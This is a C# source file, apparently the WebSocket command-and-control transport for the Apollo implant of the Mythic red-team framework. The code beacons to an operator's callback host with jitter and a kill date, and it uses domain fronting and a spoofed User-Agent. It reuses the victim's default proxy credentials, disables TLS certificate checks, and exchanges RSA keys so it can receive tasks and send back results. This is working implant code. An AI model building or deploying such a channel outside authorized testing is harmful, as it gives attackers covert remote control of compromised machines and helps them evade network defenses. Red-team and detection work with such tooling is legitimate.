using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;
using System.Collections.Concurrent;
using ST = System.Threading.Tasks;
using System.Threading;
using ApolloInterop.Serializers;
using WebsocketTransport.Models;
using WebSocketSharp;

namespace WebsocketTransport
{
    public class WebsocketProfile : C2Profile, IC2Profile
    {
        internal WebSocket Client;

        private int CallbackInterval;
        private double CallbackJitter;
        private int CallbackPort;
        private string CallbackHost;
        private string PostUri;
        // synthesis of CallbackHost, CallbackPort, PostUri
        private string Endpoint;
        private bool EncryptedExchangeCheck;
        private string UserAgent;
        private string TaskingType;
        private string KillDate;
        private string DomainFront;
        private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
        private bool _uuidNegotiated = false;
        private bool _keyExchanged = false;
        private RSAKeyGenerator rsa = null;
        private static ConcurrentQueue<byte[]> senderQueue = new ConcurrentQueue<byte[]>();
        private ST.Task agentConsumerTask = null;
        private ST.Task agentProcessorTask = null;
        private ST.Task agentPingTask = null;
        private static JsonSerializer jsonSerializer = new JsonSerializer();
        private static AutoResetEvent senderEvent;
        private static ConcurrentQueue<IMythicMessage> receiverQueue;
        private static AutoResetEvent receiverEvent;
        private Action sendAction;
        private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
        private string Uuid = "";
        private CancellationTokenSource cancellationTokenSource;
#if DEBUG
        private bool Debug = true;
#else
        private bool Debug = false;
#endif

        public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            DebugPrint("Initialize agent...");
            CallbackInterval = int.Parse(data["callback_interval"]);
            CallbackJitter = double.Parse(data["callback_jitter"]);
            CallbackPort = int.Parse(data["callback_port"]);
            CallbackHost = data["callback_host"];
            TaskingType = data["tasking_type"];
            UserAgent = data["USER_AGENT"];
            Uuid = agent.GetUUID();
            PostUri = data["ENDPOINT_REPLACE"];
            DomainFront = data["domain_front"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            rsa = agent.GetApi().NewRSAKeyPair(4096);

            if (PostUri[0] != '/')
            {
                PostUri = $"/{PostUri}";
            }
            Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
            KillDate = data["killdate"];

            string[] reservedStrings = new[]
            {
                "callback_interval",
                "callback_jitter",
                "callback_port",
                "callback_host",
                "ENDPOINT_REPLACE",
                "encrypted_exchange_check",
                "killdate",
                "USER_AGENT"
            };

            foreach (string k in data.Keys)
            {
                if (!reservedStrings.Contains(k))
                {
                    _additionalHeaders.Add(k, data[k]);
                }
            }

            // Disable certificate validation on web requests
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            Agent.SetSleep(CallbackInterval, CallbackJitter);
            sendAction = () =>
            {
                while (Client.IsAlive && Agent.IsAlive())
                {
                    senderEvent.WaitOne();
                    if (senderQueue.TryDequeue(out byte[] result))
                    {
                        if (Client.IsAlive)
                        {
                            DebugPrint("Sending message");
                            Client.Send(result);
                        }
                    }
                }
            };
        }

        private void Poll()
        {
            agentProcessorTask = new ST.Task(() =>
            {
                while (Client.IsAlive && Agent.IsAlive())
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            }, cancellationTokenSource.Token);

            agentPingTask = new ST.Task(() =>
            {
                while (Client.IsAlive && Agent.IsAlive() && !cancellationTokenSource.Token.IsCancellationRequested)
                {
                    if (!Client.Ping())
                    {
                        cancellationTokenSource.Cancel();
                    }
                    Thread.Sleep(5000);
                }
            }, cancellationTokenSource.Token);

            agentProcessorTask.Start();
            agentPingTask.Start();


            agentConsumerTask = new ST.Task(() =>
            {
                while (Client.IsAlive && Agent.IsAlive())
                {
                    if (Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (Client.IsAlive)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        } else
                        {
                            return false;
                        }
                    }))
                    {
                        Agent.Sleep();
                    } else
                    {
                        cancellationTokenSource.Cancel();
                    }
                }
            }, cancellationTokenSource.Token);

            agentConsumerTask.Start();
            try
            {
                agentConsumerTask.Wait(cancellationTokenSource.Token);
            }
            catch (OperationCanceledException)
            {
                return;
            }
        }
        private void Push()
        {
            agentConsumerTask = new ST.Task(() =>
            {
                while (Client.IsAlive && Agent.IsAlive())
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(
               delegate (TaskingMessage tm)
                        {
                            if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
                            {
                                AddToSenderQueue(tm);
                                return true;
                            }
                            return false;
                        }))
                    {
                        Thread.Sleep(100);
                    }
                }
            }, cancellationTokenSource.Token);

            agentPingTask = new ST.Task(() =>
            {
                while (Client.IsAlive && Agent.IsAlive())
                {
                    if (!cancellationTokenSource.Token.IsCancellationRequested)
                    {
                        if (!Client.Ping())
                        {
                            cancellationTokenSource.Cancel();
                        }
                    }
                    Thread.Sleep(5000);
                }
            }, cancellationTokenSource.Token);

            agentProcessorTask = new ST.Task(() =>
            {
                while (Client.IsAlive && Agent.IsAlive())
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            }, cancellationTokenSource.Token);
            agentConsumerTask.Start();
            agentProcessorTask.Start();
            agentPingTask.Start();
            try
            {
                agentPingTask.Wait(cancellationTokenSource.Token);
            }
            catch (OperationCanceledException)
            {
                return;
            }
        }

        public void Start()
        {
            DebugPrint("Started agent with tasking type: "+TaskingType);
            if (TaskingType == "Poll")
            {
                Poll();
            }
            else if (TaskingType == "Push")
            {
                Push();
            }
        }


        public bool IsOneWay()
        {
            return false;
        }

        public bool Send<T>(T message)
        {
            throw new Exception("WebsocketProfile does not support Send only.");
        }

        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive() && Client.IsAlive)
            {
                if (receiverQueue.Count == 0)
                {
                    receiverEvent.WaitOne(Timeout.Infinite, cancellationTokenSource.Token.IsCancellationRequested);
                }

                IMythicMessage msg = receiverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    receiverQueue = new ConcurrentQueue<IMythicMessage>(receiverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
            }
            return true;
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        // Only really used for bind servers so this returns empty
        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            DebugPrint("Connecting...");
            cancellationTokenSource = new CancellationTokenSource();
            receiverQueue = new ConcurrentQueue<IMythicMessage>();
            receiverEvent = new AutoResetEvent(false);
            senderEvent = new AutoResetEvent(false);

            Client = new WebSocket(Endpoint + PostUri);
            Client.WaitTime = TimeSpan.FromHours(8);

            List<KeyValuePair<string,string>> headers = new List<KeyValuePair<string, string>>();
            if (TaskingType == "Push")
            {
                headers.Add(new KeyValuePair<string, string>("Accept-Type", "Push"));
            }

            if (UserAgent != null && UserAgent != "")
            {
                headers.Add(new KeyValuePair<string, string>("User-Agent", UserAgent));
            }
            if (DomainFront != null && DomainFront != "")
            {
                headers.Add(new KeyValuePair<string, string>("Host", DomainFront));
            }

            Client.CustomHeaders = headers;

            IWebProxy proxy = WebRequest.GetSystemWebProxy();

            if (!proxy.IsBypassed(new Uri(Endpoint))) 
            {
                NetworkCredential credential = CredentialCache.DefaultCredentials as NetworkCredential;
                Client.SetProxy(proxy.GetProxy(new Uri(Endpoint)).AbsoluteUri, credential.UserName, credential.Password);
            }

            Client.OnOpen += OnAsyncConnect;
            Client.OnMessage += OnAsyncMessageReceived;
            Client.OnError += OnAsyncError;
            Client.OnClose += OnAsyncDisconnect;

            Client.Connect();

            if (Client.IsAlive)
            {
                if (EncryptedExchangeCheck && !_uuidNegotiated)
                {
                    EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                    {
                        Action = "staging_rsa",
                        PublicKey = this.rsa.ExportPublicKey(),
                        SessionID = this.rsa.SessionId
                    };
                    AddToSenderQueue(handshake1);

                    if (!Recv(MessageType.EKEHandshakeResponse,
                  delegate (IMythicMessage resp)
                        {
                            EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                            byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                            ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                            ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                            _keyExchanged = true;
                            return true;
                        }))
                    {
                        return false;
                    }
                }

                AddToSenderQueue(checkinMsg);
                if ((agentProcessorTask == null || agentProcessorTask.IsCompleted) || !agentProcessorTask.IsCompleted)
                {
                    return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                    {
                        MessageResponse mResp = (MessageResponse)resp;
                        if (!_uuidNegotiated)
                        {
                            _uuidNegotiated = true;
                            ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                            checkinMsg.UUID = mResp.ID;
                        }
                        Connected = true;
                        return onResp(mResp);
                    });
                }
                else
                {
                    return true;
                }
            }
            else
            {
                return false;
            }
        }


        private bool AddToSenderQueue(IMythicMessage msg)
        {
            DebugPrint("Adding message to send queue.");
            WebSocketMessage m = new WebSocketMessage()
            {
                client = true,
                data = "",
                tag = String.Empty
            };
            
            m.data = Serializer.Serialize(msg);
            string message = jsonSerializer.Serialize(m);
            senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));

            senderEvent.Set();
            return true;
        }

        private void OnAsyncError(object sender, ErrorEventArgs e)
        {
            DebugPrint("On error.");
            if (Client.IsAlive)
            {
                Client.Close();
            }
            cancellationTokenSource.Cancel();
        }

        private void OnAsyncDisconnect(object sender, CloseEventArgs args)
        {
            DebugPrint("Disconnected.");
            if (Client.IsAlive)
            {
                Client.Close();
            }
            cancellationTokenSource.Cancel();
        }

        private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
        {
            DebugPrint("Message received.");
            WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
            if (EncryptedExchangeCheck)
            {
                if (!_keyExchanged)
                {
                    receiverQueue.Enqueue(Serializer.Deserialize<EKEHandshakeResponse>(wsm.data));
                }
                else
                {
                    receiverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
                }
            }
            else
            {
                receiverQueue.Enqueue(Serializer.Deserialize<MessageResponse>(wsm.data));
            }

            receiverEvent.Set();
        }

        private void DebugPrint(string message)
        {
            if (Debug)
            {
                string timestampString = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string msg = "[" + timestampString + "] " + message;

                Console.WriteLine(msg);

            }
        }

        private void OnAsyncConnect(object sender, EventArgs args)
        {
            DebugPrint("Connected.");
            ST.Task tmp = new ST.Task(sendAction);
            writerTasks[Client] = tmp;
            writerTasks[Client].Start();
            Connected = true;
        }
    }
}
